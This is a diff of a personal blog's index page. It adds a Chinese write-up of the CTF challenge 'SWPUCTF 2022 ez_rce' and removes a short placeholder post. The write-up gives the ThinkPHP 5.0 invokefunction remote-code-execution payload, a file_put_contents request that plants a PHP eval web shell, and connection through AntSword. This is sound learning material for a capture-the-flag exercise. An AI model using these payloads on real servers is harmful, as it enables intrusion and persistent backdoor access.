@@ -69,6 +69,61 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-第一周1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/" class="article-date">
+  <time class="dt-published" datetime="2025-01-13T02:08:54.000Z" itemprop="datePublished">2025-01-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/">第一周1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题解  ：[SWPUCTF 2022 新生赛]ez_rce<br>   打开这个题目  发现什么也没有        </p>
+<ol>
+<li><p>这个时候可以用dirsearch -u “网址” 来看一下该网址的文件和目录<br>发现robotx.txt文件  我们打开看一下<br>发现提示NSS&#x2F;index.php&#x2F;</p>
+</li>
+<li><p>我们把NSS&#x2F;index.php&#x2F;这个路径输上去<br>发现弹出来Think.php 5.0  由此我们可以联想到Think.php 5.0 漏洞</p>
+</li>
+<li><p>我们在网上找一下 <a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1863419/202112/1863419-20211224202858742-1691585409.png">https://img2020.cnblogs.com/blog/1863419/202112/1863419-20211224202858742-1691585409.png</a><br>该网址是这个漏洞的利用方式</p>
+</li>
+<li><p>s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls &#x2F;</p>
+<p>bin boot dev etc flag home lib lib64 media mnt nss opt proc root run sbin srv sys tmp usr var var 好熟悉的界面 似曾相识啊</p>
+<p>发现flag 我们把这个ls &#x2F;换为cat &#x2F;flag<br>发现啥也没有</p>
+</li>
+<li><p>这个时候就感觉可能是套娃了  我选择构造文件来看看<br>payload ：s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;eval.php&amp;vars[1][]&#x3D;<?php eval($_POST['cmd']);?></p>
+</li>
+<li><p>我们打开中国蚁剑  路径为：<br>NSS&#x2F;eval.php 密码为 cmd<br>发现连接成功<br>发现flag<br>这个题也太坑了  真的是套娃  真的flag在nss&#x2F;ctf&#x2F;flag&#x2F;flag路径下<br>7.总结：<br>  发现页面啥也没有时 可以用dirsearch工具进行 网站目录和文件的扫描 一般可疑文件：robots.txt index.php flag.php<br>  如何出现flag但打开发现没有时 我们可以选择构造文件上传到该网站当前的目录下<br>  最终找到真的flag</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/" data-id="cm5ufzljj0000i0ui4zd82s17" data-title="第一周1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sx" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/12/sx/" class="article-date">
@@ -421,45 +476,6 @@
 
 
   
-    <article id="post-shishi" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/09/shishi/" class="article-date">
-  <time class="dt-published" datetime="2025-01-09T07:52:55.000Z" itemprop="datePublished">2025-01-09</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/09/shishi/">shishi</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><img src="https://github.com/wbwb-rgb/wbwb-rgb.github.io/blob/main/c4034f46-0296-450b-9215-115847e35591_w1024_h768.jpeg" alt="image"><br>以后会更新web内容</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/09/shishi/" data-id="cm5p1a30u0000rgui604z7yu8" data-title="shishi" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -496,6 +512,10 @@
       <ul>
         
           <li>
+            <a href="/2025/01/13/%E7%AC%AC%E4%B8%80%E5%91%A81/">第一周1</a>
+          </li>
+        
+          <li>
             <a href="/2025/01/12/sx/">sx</a>
           </li>
         
@@ -509,10 +529,6 @@
         
           <li>
             <a href="/2025/01/12/sl/">sl</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/12/lll/">lll</a>
           </li>
         
       </ul>
